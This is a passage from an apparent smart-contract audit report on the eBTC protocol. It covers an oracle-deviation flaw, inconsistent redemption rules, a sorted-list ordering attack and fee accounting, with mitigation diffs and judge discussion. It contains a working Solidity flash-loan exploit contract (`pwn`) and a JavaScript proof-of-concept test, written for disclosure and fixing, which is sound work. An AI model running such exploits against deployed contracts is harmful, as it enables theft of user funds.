        borrowerOperations = IBorrowerOperations(_borrowerOperations);
        cdpManager = ICdpManager(_cdpManager);
        hintHelpers = HintHelpers(_hintHelpers);
        collateral.approve(_borrowerOperations, type(uint256).max);
        eBTCToken.approve(_borrowerOperations, type(uint256).max);
    }

    function pwn(
        uint256 amount,
        uint256 price
    ) external {
        IERC3156FlashLender(address(borrowerOperations)).flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(eBTCToken),
            amount,
            abi.encodePacked(price)
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        uint256 price = abi.decode(data, (uint256));

        // Redeem collateral with `amount` eBTC at last valid price
        (bytes32 firstRedemptionHint, uint256 partialRedemptionHintNICR, , ) = hintHelpers
            .getRedemptionHints(amount, price, 0);
        cdpManager.redeemCollateral(
            amount,
            firstRedemptionHint,
            firstRedemptionHint,
            firstRedemptionHint,
            partialRedemptionHintNICR,
            0,
            1e18
        );

        // Open CDP with redeemed collateral at new price (now we receive more eBTC than `amount`)
        uint256 coll = collateral.balanceOf(address(this));
        uint256 newPrice = price * 2 + 1;
        uint256 debt = ((coll - 2e17 /*LIQUIDATOR_REWARD*/) * newPrice) / 110e16;
        bytes32 cdpId = borrowerOperations.openCdp(debt, bytes32(0), bytes32(0), coll);

        // Repay surplus eBTC and withdraw its proportional collateral
        uint256 availableEBTC = eBTCToken.balanceOf(address(this)) - (amount + fee);
        uint256 collToRedeem = (availableEBTC * 110e16) / newPrice;
        borrowerOperations.adjustCdp(cdpId, collToRedeem, availableEBTC, false, bytes32(0), bytes32(0));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

</details>

### Recommended Mitigation Steps

```diff
            // If Chainlink price has changed by > 50% between two consecutive rounds, compare it to Fallback's price
-           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {
+           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse) && address(fallbackCaller) != address(0)) {
                // If Fallback is broken, both oracles are untrusted, and return last good price
                // We don't trust CL for now given this large price differential
                if (_fallbackIsBroken(fallbackResponse)) {
                    _changeStatus(Status.bothOraclesUntrusted);
                    return lastGoodPrice;
                }

    (...)

            // If Chainlink is live but deviated >50% from it's previous price and Fallback is still untrusted, switch
            // to bothOraclesUntrusted and return last good price
-           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {
+           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse) && address(fallbackCaller) != address(0)) {
                _changeStatus(Status.bothOraclesUntrusted);
                return lastGoodPrice;
            }
```

**[Alex the Entreprenerd (Badger) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/310#issuecomment-1818624395):**
 > The pre-requisite to this finding is CL having a 50% Deviation between two rounds.
> 
> This is extremely unlikely.
> 
> That said, the logic is incorrect and the finding is a valid gotcha we will fix.

**[rayeaster (Badger) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/310#issuecomment-1823886407):**
 > I would suggest another fix approach different from above "Recommended Mitigation" since it make sense to set the status to `bothOraclesUntrusted` if fallback not set while CL got a big (>50%) reporting deviation between two rounds.
> 
> Using above "Recommended Mitigation" would result in exactly what it is trying to avoid: "the price returned will be the current Chainlink price".
> 
> Since eBTC allows [empty fallback](https://github.com/ebtc-protocol/ebtc/commit/b9f999fb1a63193677be66d110e72ff5cca0bca6) (unlike original Liquity which always assumes the fallback is set) so additional checks are required to be executed around:
> 
> - function `_bothOraclesLiveAndUnbrokenAndSimilarPrice()`
> - function `_bothOraclesSimilarPrice()`
> 
> to distinguish the scenarios when fallback is set (broken/frozen) AND when fallback is not set at all.
> 
> ```diff
>      function _bothOraclesLiveAndUnbrokenAndSimilarPrice(
>         ChainlinkResponse memory _chainlinkResponse,
>         ChainlinkResponse memory _prevChainlinkResponse,
>         FallbackResponse memory _fallbackResponse
>     ) internal view returns (bool) {
>         // Return false if either oracle is broken or frozen
>         if (
> +          (address(fallbackCaller) != address(0) && (_fallbackIsBroken(_fallbackResponse) || _fallbackIsFrozen(_fallbackResponse))) ||
> -           _fallbackIsBroken(_fallbackResponse) ||
> -           _fallbackIsFrozen(_fallbackResponse) ||
>             _chainlinkIsBroken(_chainlinkResponse, _prevChainlinkResponse) ||
>             _chainlinkIsFrozen(_chainlinkResponse)
>         ) {
>             return false;
>         }
> 
>         return _bothOraclesSimilarPrice(_chainlinkResponse, _fallbackResponse);
>     }
> 
>     
>     function _bothOraclesSimilarPrice(
>         ChainlinkResponse memory _chainlinkResponse,
>         FallbackResponse memory _fallbackResponse
>     ) internal pure returns (bool) {
> +       if (address(fallbackCaller) == address(0)){
> +           return true;
> +       }       
>         // Get the relative price difference between the oracles. Use the lower price as the denominator, i.e. the reference for the calculation.
>         uint256 minPrice = EbtcMath._min(_fallbackResponse.answer, _chainlinkResponse.answer);
>         ......
>     }
> ```
> 
> And finally, we need to apply some extra guards in the state machine for status `bothOraclesUntrusted` and ensure that the price-similarity comparison between primary & fallback oracle happens **ONLY AFTER** other single-source checks (bad/frozen/max-deviation):
> 
> ```diff
>   function fetchPrice() external override returns (uint256) {
>         ......
>         // --- CASE 3: Both oracles were untrusted at the last price fetch ---
>         if (status == Status.bothOraclesUntrusted) {
>             /*
>              * If there's no fallback, only use Chainlink
>              */
>             if (address(fallbackCaller) == address(0)) {
>                 // If CL has resumed working
>                 if (
>                     !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&
>                     !_chainlinkIsFrozen(chainlinkResponse)
> +                   && !_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)
>                 ) {
>                     _changeStatus(Status.usingChainlinkFallbackUntrusted);
>                     return _storeChainlinkPrice(chainlinkResponse.answer);
>                 }
> +               else {
> +                   return lastGoodPrice;
> +               }
>             }
> 
>          ......
>    }
> ```
> 
> The PR for the fix is TBA

**[ronnyx2017 (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/310#issuecomment-1826186823):**
 > If the price oracle will be used for tokens with high volatility, I belive this should be at least a medium risk issue. However, if it's only for BTC and stETH, it's more like a QA under normal rules. The mitigation from the sponsor shows that it's a safety design for price oracle. This fills the gap in the confidence interval of chainlink. I think it can be marked as a med risk, as a defence bypass instead of a price manipulation.



***

## [[M-02] Redemptions are inconsistent with other cdp's operations](https://github.com/code-423n4/2023-10-badger-findings/issues/199)
*Submitted by [0xRobocop](https://github.com/code-423n4/2023-10-badger-findings/issues/199), also found by [ether\_sky](https://github.com/code-423n4/2023-10-badger-findings/issues/268)*

Most actions that modify the (ICR) of a Collateralized Debt Position (CDP) must adhere to specific regulations to maintain the system's stability. For instance, closing a CDP or decreasing its collateral is not permitted if it would trigger the system's recovery mode, or if the system is already in that mode.

However, the rules for redemptions are less stringent. The only conditions are that both the system and the CDPs undergoing redemption must have an TCR and ICR above the MCR. So, it is possible to redeem a cdp that is actually helping the system to stay healthy.

### Proof of Concept

Follow the next steps to run the coded proof of concept:

*   Copy and paste the following test under `test/CdpManagerTest.js`:

<details>

```

    it.only("redeemCollateral(): Is inconsistent with other cdp behaviors", async () => {
        await contracts.collateral.deposit({from: A, value: dec(1000, 'ether')});
        await contracts.collateral.approve(borrowerOperations.address, mv._1Be18BN, {from: A});
        await contracts.collateral.deposit({from: B, value: dec(1000, 'ether')});
        await contracts.collateral.approve(borrowerOperations.address, mv._1Be18BN, {from: B});
        await contracts.collateral.deposit({from: C, value: dec(1000, 'ether')});
        await contracts.collateral.approve(borrowerOperations.address, mv._1Be18BN, {from: C});

        // @audit-info Current BTC / ETH price is 1.
        const newPrice = dec(1, 18);
        await priceFeed.setPrice(newPrice)

        // @audit-info Open some CDPs.
        await borrowerOperations.openCdp(dec(400, 18), A, A, dec(1000, 'ether'), { from: A })
        await borrowerOperations.openCdp(dec(75, 18), B, B, dec(100, 'ether'), { from: B })
        await borrowerOperations.openCdp(dec(75, 18), C, C, dec(100, 'ether'), { from: C })

        let _aCdpId = await sortedCdps.cdpOfOwnerByIndex(A, 0);
        let _bCdpId = await sortedCdps.cdpOfOwnerByIndex(B, 0);
        let _cCdpId = await sortedCdps.cdpOfOwnerByIndex(C, 0);

        const price = await priceFeed.getPrice()
        
        const currentTCR = await cdpManager.getSyncedTCR(price);
        console.log("TCR of the system before price reduction: " + currentTCR.toString())

        // @audit-info Some price reduction.
        const newPrice2 = dec(6, 17);
        await priceFeed.setPrice(newPrice2)

        const price2 = await priceFeed.getPrice()

        const currentTCR2 = await cdpManager.getSyncedTCR(price2);
        console.log("TCR of the system after price reduction" + currentTCR2.toString())

        // @audit-info All cdps are in the linked list.
        assert.isTrue(await sortedCdps.contains(_aCdpId))
        assert.isTrue(await sortedCdps.contains(_bCdpId))
        assert.isTrue(await sortedCdps.contains(_cCdpId))

        await cdpManager.setBaseRate(0) 

        // @audit-info Redemption of 400 eBTC.
        const EBTCRedemption = dec(400, 18)
        await th.redeemCollateralAndGetTxObject(A, contracts, EBTCRedemption, GAS_PRICE, th._100pct)

        // @audit-info Redemption will happen to A's position because B and C ICRs are below MCR.
        assert.isFalse(await sortedCdps.contains(_aCdpId))
        assert.isTrue(await sortedCdps.contains(_bCdpId))
        assert.isTrue(await sortedCdps.contains(_cCdpId))
        
        // @audit-issue UNDERCOLLATERALIZED
        const currentTCR3 = await cdpManager.getSyncedTCR(price2);
        console.log("TCR after redemption: " + currentTCR3.toString())
      })
```
</details>

This proof of concept highlights a significant risk: a situation where the entire system becomes undercollateralized. Although the likelihood of this occurring is low, there are other, more probable scenarios to consider. One such scenario involves executing one or multiple redemptions that push the system into recovery mode.

Currently, there's a redemption fee in place that escalates the cost of withdrawing large amounts of collateral, serving as a financial deterrent to potential manipulation. However, this is primarily an economic obstacle. Given that eBTC aims to be a fundamental component for Bitcoin in the Ethereum DeFi ecosystem, it's crucial to ensure that redemptions do not jeopardize the system's stability.

It should also be noted that the RiskDao's analysis regarding redemptions does not extend to situations where redemptions are strategically used to affect the system's collateralization.

### Recommended Mitigation Steps

Redemptions should have the same rules for other cdp changes. For example:

*   Redeeming should not let the system in RM
*   Redeeming should not be possible if the system is in RM unless it makes the system to get out of RM

**[Alex the Entreprenerd (Badger) confirmed and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/199#issuecomment-1842602212):**
 > I believe the finding to be valid, under the specific circumstance of:
> - CDPs with Bad Debt
> - No CDPs with ICR > MCR and ICR < CCR
> 
> A redemption can cause TCR to decrease and trigger recovery mode.
> 
> This is extremely unlikely as it's irrational for people to redeem instead of liquidate, however it could be used to trigger Recovery Mode in unintended way.
> 
> Additionally, the issue is not fixable as bad debt redistributions could be so big as to trigger RM separately and that's not avoidable.
> 
> I appreciate the time taken by the Warden and believe this will have to be sorted by reserving some amount of eBTC for Bad Debt Liquidations as means to "clean up" those risky CDPs, I believe this can be done profitable for the DAO in place of redemptions and as such believe we will:
> 
> - Add the check to prevent directly triggering RM
> - Assume it will still be possible to trigger RM directly
> - Monitor this situation
> - Have some eBTC to perform said liquidations to avoid this scenario under most reasonable conditions

_Note: See full discussion [here](https://github.com/code-423n4/2023-10-badger-findings/issues/199)._

***

## [[M-03] Attacker can utilize function `CdpManager.redeemCollateral()` to break the order of sortedCdps](https://github.com/code-423n4/2023-10-badger-findings/issues/173)
*Submitted by [TrungOre](https://github.com/code-423n4/2023-10-badger-findings/issues/173)*

<https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/CdpManager.sol#L434-L443> 

<https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/CdpManager.sol#L209-L214>

The `CdpManager.redeemCollateral()` function is used to send the `_debt` amount of EBTC to the system and redeem the corresponding amount of stETH. There are two important features to note about this function before delving into the problem:

*   The function begins redemption from the Cdp with the smallest ICR, where the ICR is greater than or equal to MCR. The subsequently redeemed Cdps will follow the ascending order of NICR in the `SortedCdps` list.
*   All Cdps that are redeemed, with the likely exception of the last one, will end up with no remaining debt and will be closed. If the last Cdp does have some remaining debt and collateral (indicating a valid and meaningful ICR), it will be reinserted into the `SortedCdps` list using the "hint" provided by the users/front-end.

The protocol utilizes a new technique by employing a `sortedCdps.batchRemove()` function to remove a consecutive sequence of Cdps in the sorted list after the redemption loop, instead of removing each one individually in each iteration of the loop for gas-saving purposes.

```solidity
while (
    currentBorrower != address(0) && totals.remainingDebtToRedeem > 0 && _maxIterations > 0
) {
    ... 
    SingleRedemptionValues memory singleRedemption = _redeemCollateralFromCdp(
        _redeemColFromCdp
    );
    ... 
}

// remove from sortedCdps
if (_numCdpsFullyRedeemed == 1) {
    sortedCdps.remove(_firstRedeemed);
} else if (_numCdpsFullyRedeemed > 1) {
    bytes32[] memory _toRemoveIds = _getCdpIdsToRemove(
        _lastRedeemed,
        _numCdpsFullyRedeemed,
        _firstRedeemed
    );
    sortedCdps.batchRemove(_toRemoveIds);
}
```

As we observe, in each iteration of the loop, the internal function `CdpManager._redeemCollateralFromCdp()` is triggered, executing the following logic:

*   If there is no remaining debt, the Cdp should be closed. To accomplish this, the function `CdpManagerStorage._closeCdpByRedemption()` will be [triggered](https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/CdpManager.sol#L171-L177), assigning the new STORAGE debt and collateral for the corresponding Cdp:

    *   `Cdps[_cdpId].coll = 0;`
    *   `Cdps[_cdpId].debt = 0;`

    However, no "remove" operation will be executed for the Cdp in the `SortedCdps` list. Consequently, the removed Cdp will remain in the same position in the sorted list after the for-loop, with the new collateralization ratio (NICR), which is `type(uint256).max` following these [lines of code](https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/Dependencies/EbtcMath.sol#L92-L101).

*   Otherwise, the Cdp will be assigned a remaining value of debt and collateral and will immediately be reinserted into the `SortedCdps` list.

The flaw arises when the partially redeemed Cdp is reinserted while the fully redeemed Cdps haven't been removed from the sorted list yet.

To make it clearer, consider the following scenario:
In a regular flow of the redemption process, we have:

1.  The `SortedCdps` list described by a sequence of `n` elements $x\_1, x\_2, ..., x_n$ in which:
    *   $$x\_1 \geq x\_2 \geq ... \geq x_n$$

2.  A redemption request fully redeems Cdps from position `i+1 -> j-1` in the sorted list. Thus, the NICR of all Cdps in that range becomes `inf = type(uint256).max`. In other words:
    *   $$x\_{i+1} = x\_{i+2} = ... = x\_{j-1} = inf$$

3.  The Cdp in position `i` is partially redeemed and updated with its NICR to $x_i'$. If the new $x_i'$ is greater than $x\_{i-1}$, it should be reinserted in a smaller position than `i-1`, assuming it should be inserted between $x\_{i-3}$ and $x\_{i-2}$. The new `SortedCdps` list right after the loop should be:
    *   $$x\_1, ; ..., ; x\_{i-3}, ; x\_{i}', ; x\_{i-2}, ; x\_{i-1}, ; inf, ; ..., ; inf, ; x_j, ; ..., ; x_n$$
    This means that the values passed by the sender of `_upperPartialRedemptionHint` and `_lowerPartialRedemptionHint` should be `i-2, i-3`.

4.  After that, the process will execute the batch removal to remove all the Cdps that are fully redeemed, and the sorted list will be:
    *   $$x\_1, ; ..., ; x\_{i-3}, ; x\_{i}', ; x\_{i-2}, ; x\_{i-1}, ; x_j, ; ..., ; x_n$$

To disrupt this flow, the attacker can interfere in STEP 3 by passing malicious values of `_upperPartialRedemptionHint` and `_lowerPartialRedemptionHint`. In the example above, the attacker should use:

*   `_upperPartialRedemptionHint = j-1`
*   `_lowerPartialRedemptionHint = j`

Since the Cdp at position `j-1` hasn't been removed yet in STEP 3, all the conditions for a valid insertion for $x\_{i}'$ will be satisfied because:

*   $x\_{i}' ; > ; x\_{i-1} ; >= ; x_j$
*   $x\_{i}' ; < ; inf ; = ; x\_{j-1}$

Thus, the `SortedCdps` list will look like this after the redemption process:

*   $$x\_1, ;..., ; x\_{i-3}, ; x\_{i-2}, ; x\_{i-1}, ; x_i', ; x_j, ; ..., ; x\_{n} $$

This breaks the order of the `SortedCdps` because $x_i' > x\_{i-1}$ but has a larger position.

### Impact

The sequence of the `sortedCdps` list will be disrupted, and given that essential protocol functions operate in accordance with this sequence, the severity of the issue is significant.

### Recommended Mitigation Steps

Instead of inserting the partially redeemed Cdp back in the for-loop, the function should reinsert it after removing the fully redeemed Cdp.

**[Alex the Entreprenerd (Badger) disputed and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1818681956):**
 > The finding is known and part of the known broken invariants + cantina report.
> 
> We would be more lenient if any impact was demonstrated but afaict there's only an edge case for Redemptions not working when liquidations are more profitable which would lead me to dispute even in that case.
> 
> We are interested in more impacts if those were found.
>
> We would want to ask the Warden for the POC as we have a concern for the issue being valid, but it seems like the finding is impossible in practice.

**[rayeaster (Badger) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1824252432):**
 > [Here](https://gist.github.com/CodingNameKiki/4925e433ee47be70e6a4ef3eebe75b81?permalink_comment_id=4770452#gistcomment-4770452) is a working POC to verify the finding.

**[ronnyx2017 (Judge) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1827474072):**
 > > The finding is known and part of the known broken invariants + cantina report.
> 
 > I have noticed that a pull request https://github.com/ebtc-protocol/ebtc/pull/725 has been submitted to the main repo for this issue. Is this really OOS, @Alex the Entreprenerd?

**[Alex the Entreprenerd (Badger) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1827750199):**
 > The breaking of sorting is known but the mechanism through which this was achieved was not, so we believe the finding to be in scope.
> 
> The impact of this finding is unclear.

**[ronnyx2017 (Judge) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1834962777):**
 >  The attack scenario provided by the warden is very clear, but I don't see any actual profit or loss from it. Warden might argue that the CDP's position is incorrect after partial redemption, leading to damage upon the next redemption. However, in reality, it could have been fully redeemed initially, and the attacker wouldn't have gained any additional profits from it. But this clearly violates a critical invariant, especially when carefully crafted inputs are used as attack vectors. Therefore, I believe this falls into a med category.

**[CodingNameKiki (Warden) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1837848836):**
 > Currently working alongside the Badger team on some mitigations.
> 
> So on short explanation I understood that this issue:
> - Have no impact that I am aware of.
> - Messes up only the first redeemable node after the attack.
> - The node ordering is back to normal when someone else redeems after the attack.
> 
> > The attack scenario provided by the warden is very clear, but I don't see any actual profit or loss from it.
> 
> Agree with you on this one, at the same time an interesting question is why would anyone want to do this if there is no profit from it, no impact and the sorted order is back to normal on the next redeem.
> 
> https://gist.github.com/CodingNameKiki/b3f36aacc704c082df2b974b2db89c78

**[ronnyx2017 (Judge) decreased severity to Low/Non-critical and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1839714678):**
 > Thanks for the poc and verification from @CodingNameKiki . And the sponsor finally convinced me. The invariant was only temporarily broken, and whatever the attacker does during this intermediate stage will get back to the previous state. This impact is so minimal that it can be downgraded to a QA.

**[WelToHackerLand (Warden) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1839885882):**
 > Hello @ronnyx2017 & @rayeaster, thank you for reviewing the issue.
> 
> I would like to respectfully question the severity of the problem for the following reasons:
> 
> - Initially, there doesn't seem to be an attacker involved in this issue, as a regular user seeking partial redemption could potentially disrupt the sorted cdps. The provided Proof of Concept (POC) demonstrates that the hints used by the sender are derived from the `hintHelpers` contract rather than being predetermined by an attacker.
> 
> - Additionally, the POC presented by @CodingNameKiki might be applicable only when the redemption occurs immediately after. What if other transactions take place before the fixed redemption? For instance, consider a scenario where the NICR of `sortedCdps` post-redemption disrupts the order, such as [8, 12, 5]. If a user intends to open a new CDP with NICR = 9, the provided hints could be before NICR = 8, resulting in the new sorted cdps as [9, 8, 12, 5]. In this case, there are now two incorrect positions in the sorted list instead of one. The more `openCdp()` transactions are initiated, the more incorrect positions could emerge, and the cost to rectify the order becomes higher.
> 
> Considering these factors, I believe the severity of this issue should be classified as medium.

**[CodingNameKiki (Warden) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1840130729):**
 > > Initially, there doesn't seem to be an attacker involved in this issue, as a regular user seeking partial redemption could potentially disrupt the sorted cdps. The provided Proof of Concept (POC) demonstrates that the hints used by the sender are derived from the hintHelpers contract rather than being predetermined by an attacker.
> 
> Do you mean providing wrong **\_firstRedemptionHint** or wrong **\_partialRedemptionHintNICR**, if that's the case the system will manually find the correct redeemable hint which is the first node with ICR >= MCR, on the other hand if you provide a wrong partial hint NICR the partial redeeming will be cancelled. 
> 
> ```solidity
>         if (_isValidFirstRedemptionHint(_firstRedemptionHint, totals.price)) {
>             currentBorrower = sortedCdps.getOwnerAddress(_firstRedemptionHint);
>         } else {
>             _cId = sortedCdps.getLast();
>             currentBorrower = sortedCdps.getOwnerAddress(_cId);
>             // Find the first cdp with ICR >= MCR
>             while (currentBorrower != address(0) && getSyncedICR(_cId, totals.price) < MCR) {
>                 _cId = sortedCdps.getPrev(_cId);
>                 currentBorrower = sortedCdps.getOwnerAddress(_cId);
>             }
>         }
> ```
> ```solidity
>             if (
>                 newNICR != _redeemColFromCdp.partialRedemptionHintNICR ||
>                 collateral.getPooledEthByShares(newColl) < MIN_NET_STETH_BALANCE
>             ) {
>                 singleRedemption.cancelledPartial = true;
>                 return singleRedemption;
>             }
> ```
> 
> In case you are talking about the **upper** and **lower** hints used in the POC, I tried every other possible hints and the system is working correctly. So this scenario is only possible if someone provided the exact hints and only when the system fully redeems a node and partially redeems from another.
> 
> > We would be more lenient if any impact was demonstrated but afaict there's only an edge case for Redemptions not working when liquidations are more profitable which would lead me to dispute even in that case
> We are interested in more impacts if those were found
> 
> As mentioned we are already aware and it's known that wrong sorting can happen from the broken invariants, the question should be what impact does this issue lead to? Would suggest for a further research on the impact here and coded POC.

**[huuducsc (Warden) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1841303646):**
 > @ronnyx2017, @rayeaster, & @Alex the Entreprenerd -
> I would like to explain the reasons why I believe this issue should be considered at least a medium severity. I also believe that these explanations can address the concerns raised from @codingnamekiki and others to downgrade this issue.
> 
> 1.  I believe the provided attack vector is very clear, indicating that an attacker can disrupt the sorting order of CDPs through partial redemption. The attacker just needs to call the function redeemCollateral with malicious values for `_upperPartialRedemptionHint` and `_lowerPartialRedemptionHint` to place the partially redeemed CDP in the wrong position. The scenario was described very clearly in the report, and there is another proof of concept (POC) mentioned in [the comment by @rayeaster](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1824252432).<br>
> Additionally, I believe it's not a known issue because the known scenario that also breaks the order is from redistribution of debt and yield, which is different. This scenario allows an external attacker to interact with and manipulate the broken invariants. It has a significant impact, which will be described below.
> 
> 2.  An attacker can increase the NICR of a partially redeemed CDP to a very large value and place it in the wrong position. To achieve this, the attacker can calculate the redemption amount to leave the remaining debt of the partially redeemed CDP at 1. For example, if a CDP has &#36;15e18 in collateral and &#36;10e18 in debt, the attacker can calculate a partial redemption with a debt of &#36;10e18 - 1, resulting in a remaining debt of 1 and remaining collateral of 5e18 (assuming remaining collateral can bypass MIN\_NET\_STETH\_BALANCE). This manipulation causes the new NICR to become very large.<br>
> Consider the scenario in the report. After redemption, the sortedCdps list will be:<br>
> $$x_1, \;..., \; x_{i-3}, \; x_{i-2}, \; x_{i-1}, \; ..., \; x_i', \; x_j, \; ..., \; x_{n} $$
> $x_{i}'$ may have a very large NICR (up to infinity), and it is the first node with ICR >= MCR because the ICR of $x_{j}$ is below MCR. Therefore, any new CDP that is opened with `_upperHint` as dummy or invalid will be placed after the CDP $x_{i}'$. This is because the `_findInsertPosition` function will find the position in ascending order if the `_prevId `parameter is dummy or invalid.You can read this [code snippet](https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/SortedCdps.sol#L699-L701) to understand this flow.<br>
> For example, when the NICR of $x_{i}'$ is very large (considered infinity), the NICR list of sortedCdps is like:<br>
> 300%, 250%, ..., 160%, 150%, inf, 125%, 124%, ...<br>
> When opening a CDP with a 200% NICR and `_upperHint` as dummy or invalid, the list will become:<br>
> 300%, 250%, ..., 160%, 150%, inf, 200%, 125%, 124%, ...<br>
> Therefore, the new CDP (200% NICR) will be inserted to a wrong position and become the first node (most right) with ICR > MCR and will be redeemed with priority, even though the NICR of that CDP is still good.<br>
> Here is a POC of this scenario: https://gist.github.com/huuducsc/c6885a06058d56cd4f6669f3b11c8f7d
> 
> 3.  Due to the above scenario, I disagree with [the statement](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1839714678) made by @ronnyx2017: "The invariant was only temporarily broken, and whatever the attacker does during this intermediate stage will get back to the previous state."<br>
> The attacker can open numerous new Cdps into incorrect positions using dummy `upperHint` and invalid `lowerHint` (details are described in the scenario and PoC of section 2), disrupting the order of protocols. Moreover, the attacker can front-run any opening CDP transaction by users to break the order, make it becomes the first position to be redeemed. 
> Here are the details of the impacts that cause significant damage to protocol:<br>
> * The attacker can break the order of `sortedCdps` and disrupt it by opening many new CDPs with `_upperHint` is dummy, placing them in incorrect positions (as described above). Therefore, sortedCdps will have many incorrect positions that are not easy to resolve. This disruption can mess up the protocol's data and may result in incorrect returns from the HintHelpers contract.
> * After the mentioned manipulation, any new CDP will be at risk of being redeemed with priority, even though its NICR is still good. This can happen if the `_upperHint` passed to the `openCdp` function of users is dummy or invalid, which can occur normally due to changes in on-chain data like front-running or incorrect returns from the HintHelper contract. It creates an unfair situation for protocol users, as they may be compelled to redeem their assets (acquiring debt assets and losing collateral assets) even when they have a CDP with a high NICR.
> 
> In conclusion, this issue has a significant impact that can disrupt the ordered state of the protocol and put users at risk of having their assets forcibly redeemed. However, the severity may increase if attackers identify other attack vectors (which I haven't found until now) to manipulate the state and exploit vulnerabilities since attackers are able to break order invariants externally.

**[CodingNameKiki (Warden) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1841381369):**
 > ^ Thanks for the reply, check the below POC which confirms the above statements.
> 
> https://gist.github.com/CodingNameKiki/0f4bc68802cfcbfe255759554b735b38

**[ronnyx2017 (Judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/173#issuecomment-1842395637):**
 > Thank you warden for providing additional information on the impact. This has made the report ultimately comprehensive and clear.
> 
> I have discussed the final rating based on the following facts, rules, and input from two senior judges. We ultimately elevate this issue to MEDIUM.<br>
> **Record I (recommendations from senior judges):**
> > As the original submission doesn't contain a PoC of the final impact, I think Medium is more appropriate.
> 
> **Record II (my assessment):**
> > 1. For the impact I. 
> > 
> > > This disruption can mess up the protocol's data and may result in incorrect returns from the HintHelpers contract.
> > 
> > it meets the criteria of MED. Although it is not dos, it affected the availability of the protocol for normal users.
> > 
> > > but the function of the protocol or its availability could be impacted
> > 
> > 2. For impact II.
> > 
> > > It creates an unfair situation for protocol users, as they may be compelled to redeem their assets (acquiring debt assets and losing collateral assets) even when they have a CDP with a high NICR.
> > 
> > It's based on impact I, but I think it can be a HIGH according to the criteria:
> > 
> > > Assets can be ~stolen/lost/~ compromised ~directly or~ indirectly if there is a valid attack path that does not have hand-wavy hypotheticals
> > 
> > Because attackers are able to break order invariants externally, we can believe the attack path is explicit (include front run). And the redemption from high NICR cdp won't result in a direct loss of assets, but it is clearly a form of compromise.

_Note: For further discussion, see [here](https://github.com/code-423n4/2023-10-badger-findings/issues/173)._

***

## [[M-04] The way fees are accounted can break the sorted list order](https://github.com/code-423n4/2023-10-badger-findings/issues/155)
*Submitted by [0xBeirao](https://github.com/code-423n4/2023-10-badger-findings/issues/155)*

eBTC borrows the corrected stake mechanism from Liquity for reward distributions. ([paper](https://github.com/liquity/dev/blob/main/papers/Efficient_Order-Preserving_Redistribution_of_Troves.pdf))

Doing a pure collateral proportionnal redistribution will over-rewards fresh cdps, and under-rewards older troves. The redistribution must deal with the fact that some fraction of a cdp’s entire collateral is the accumulated reward from previous liquidations, and this fraction varies across cdps.

The corrected stake was introduced by Liquity to correct for this.

> The intuition behind the choice of corrected stake is that the corrected stake effectively models the fresh trove’s collateral as a total collateral, which includes ‘virtual’ accumulated rewards. The corrected stake earns rewards for the trove as if the trove had been in the system from the beginning - thus maintaining proportional reward growth.

*([Source](https://github.com/liquity/dev/blob/main/papers/Efficient_Order-Preserving_Redistribution_of_Troves.pdf>))*

eBTC makes some modifications to the original design that make the protocol vulnerable to an order break in the sorted list.

Let’s explain why.

Initially `totalStake == totalCollateral`, this is because no fees have been taken yet. Then, as the stETH value increases the protocol takes 50\%. (if stETH apr is 5\% then eBTC takes 2,5\% as fees): [CdpManagerStorage.sol#L509-L521](https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/CdpManagerStorage.sol#L509-L521).

```solidity
function _calcSyncedGlobalAccounting(
    uint256 _newIndex,
    uint256 _oldIndex
) internal view returns (uint256, uint256, uint256) {
    if (_newIndex > _oldIndex && totalStakes > 0) {
        /// @audit-ok We don't take the fee if we had a negative rebase
        (
            uint256 _feeTaken,
            uint256 _deltaFeePerUnit,
            uint256 _perUnitError
        ) = calcFeeUponStakingReward(_newIndex, _oldIndex);

        // calculate new split per stake unit
        uint256 _newPerUnit = systemStEthFeePerUnitIndex + _deltaFeePerUnit;
        return (_feeTaken, _newPerUnit, _perUnitError);
    } else {
        return (0, systemStEthFeePerUnitIndex, systemStEthFeePerUnitIndexError);
    }
}
```

